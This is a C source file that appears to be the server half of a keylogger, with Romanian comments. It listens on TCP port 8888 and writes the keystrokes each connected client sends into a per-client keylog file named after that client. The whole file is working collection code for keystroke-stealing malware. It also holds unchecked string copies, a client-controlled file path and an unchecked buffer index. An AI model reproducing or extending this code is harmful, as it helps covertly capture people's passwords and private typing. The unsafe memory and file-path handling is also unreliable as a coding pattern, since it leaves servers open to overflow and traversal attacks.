#include "serverManager.h"
#include "utils.h"
#include "constraints.h"
#include "messageManager.h"

#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

extern clientHandler_t clientHndler;

void handleOpcode(message_t msg, int clientSock)
{

    switch (msg.opCode)
    {
        case 'K':
        if(clientHndler.clientsAttr[clientSock].recordKeys)
            {
                //printf("Should write to file %d, buffer: %s; size: %d\n", clientHndler.clientsAttr[clientSock].keylogger_fd, 
                //msg.buffer, msg.size);
                if (write(clientHndler.clientsAttr[clientSock].keylogger_fd, msg.buffer, msg.size) == -1)
                {
                    printf("ERROR WHEN WRITING TO %d\n", clientHndler.clientsAttr[clientSock].keylogger_fd);
                }
            }
        break;

        case 'U':
            strcpy(clientHndler.clientsAttr[clientSock].name, msg.buffer);
            char filename[BUFFER_SIZE];
            snprintf(filename, sizeof(filename), "keylog%s.txt", clientHndler.clientsAttr[clientSock].name);

            clientHndler.clientsAttr[clientSock].keylogger_fd = open(filename, O_CREAT | O_APPEND | O_WRONLY, 0664);
            if (clientHndler.clientsAttr[clientSock].keylogger_fd == -1) {
                perror("Eroare la deschiderea fișierului de Keylog");
            }
        break;
    default:
        fflush(NULL);
        printf("WRONG OPCODE(%c) FROM %d\n", msg.opCode, clientSock);
        fflush(NULL);
        break;
    }
}

void* handle_client(void* params) {
    parameters_t *args = (parameters_t*) params;

    message_t client_message;
    int read_size;

    // Primesc date de la client
    while ((read_size = recv(args->client_sock, &client_message, sizeof(client_message), 0)) > 0) {
        client_message.buffer[client_message.size] = '\0';
        //printf("Mesaj primit de la %d(OpCode: %c): %s\n", args->client_sock, client_message.opCode, client_message.buffer);
        handleOpcode(client_message, args->client_sock);

    }

    // if (read_size == 0) {
    //     printf("Clientul %d s-a deconectat.\n", args->client_sock);
    // } else if (read_size == -1) {
    //     perror("Eroare la primirea datelor");
    // }

    // Curățare resurse
    if (clientHndler.clientsAttr[args->client_sock].keylogger_fd != -1) {
        close(clientHndler.clientsAttr[args->client_sock].keylogger_fd);
        clientHndler.clientsAttr[args->client_sock].keylogger_fd = -1;
    }
    close(args->client_sock);
    
    for(int i = 0; i < clientHndler.numberClients; i++)
    {
        if (clientHndler.socketsClients[i] == args->client_sock)
        {
            for(int j = i; j < clientHndler.numberClients - 1; j++)
            {
                clientHndler.socketsClients[j] = clientHndler.socketsClients[j+1];
            }
            clientHndler.numberClients--;
            break;
        }
    }

    free(params);
    return NULL;
}

void sock_init(int *socket_desc, struct sockaddr_in* server)
{
    *socket_desc = socket(AF_INET, SOCK_STREAM, 0);
    if (*socket_desc == -1) {
        perror("Could not create socket\n");
        exit(-1);
    }
    printf("Socket created\n");

    // Prepare the sockaddr_in structure
    server->sin_family = AF_INET;
    server->sin_addr.s_addr = INADDR_ANY;
    server->sin_port = htons(8888);

    // Bind
    if (bind(*socket_desc, (struct sockaddr *)server, sizeof(*server)) < 0) {
        perror("Bind failed. Error");
        exit(-1);
    }
    printf("Bind done\n");

    // Listen
    if(listen(*socket_desc, 3) == -1)
    {
        perror("Listen failed. Error");
        exit(-1);
    }
}

void setZeroClientHandler(clientAttributes_t* clientAttr)
{
    strcpy(clientAttr->name, "P");
    clientAttr->keylogger_fd = -1;
    clientAttr->recordKeys = 1;
}